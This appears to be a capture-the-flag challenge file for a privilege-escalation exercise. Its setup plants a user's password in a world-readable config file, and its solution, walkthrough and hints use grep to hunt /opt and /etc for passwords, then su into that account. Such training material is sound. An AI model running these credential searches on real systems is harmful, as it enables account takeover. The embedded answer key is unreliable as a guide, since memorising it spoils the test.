title: Written down in the open
level: Intermediate
kind: Privilege escalation
points: 60
order: 15
answer: flag
var: PW = word

@intro
You are the user player. Another user, deploy, keeps the flag in their home folder.
Somewhere readable on this box, a config file holds deploy's password. Find it, sign
in as deploy (su), and read the flag.

@setup
useradd -m deploy
echo 'deploy:{{PW}}' | chpasswd
printf '%s\n' '{{FLAG}}' > /home/deploy/flag.txt
chown deploy: /home/deploy/flag.txt
chmod 600 /home/deploy/flag.txt
mkdir -p /opt/app
cat > /opt/app/config.ini <<CFG
[database]
host = localhost
[deploy]
user = deploy
password = {{PW}}
CFG
chmod 644 /opt/app/config.ini

@solution
grep -riE 'password' /opt /etc 2>/dev/null
cat /opt/app/config.ini
su - deploy
{{PW}}
cat flag.txt
exit

@walkthrough
Search the places apps keep settings for a password:

    grep -riE 'password' /opt /etc 2>/dev/null

/opt/app/config.ini has deploy's password in plain text. Sign in as deploy and read
the flag:

    su - deploy        (then type the password)
    cat flag.txt

The lesson: never keep passwords in world-readable config files, and don't reuse a
login password in a file.

@hint 5
Applications need passwords to talk to databases and other services, and people often store them in plain-text config files - and reuse them for their own accounts.

@hint 10
Look for the word "password" in config files: grep -ri password /opt /etc 2>/dev/null (-r searches folders, -i ignores case).

@hint 16
The password is in /opt/app/config.ini. Then: su - deploy (type the password) and cat ~/flag.txt
